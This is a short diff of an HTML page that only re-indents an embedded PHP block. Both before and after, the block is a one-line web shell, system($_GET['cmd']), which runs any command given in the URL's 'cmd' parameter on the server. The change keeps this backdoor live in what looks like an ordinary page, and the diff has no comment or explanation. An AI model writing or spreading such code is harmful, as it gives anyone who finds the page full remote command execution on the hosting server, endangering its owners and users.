@@ -1,8 +1,9 @@
 <html>
   
-<script><?php
-system($_GET['cmd']);
-?>
+<script>
+  <?php
+    system($_GET['cmd']);
+  ?>
 </script>
 
 </html>
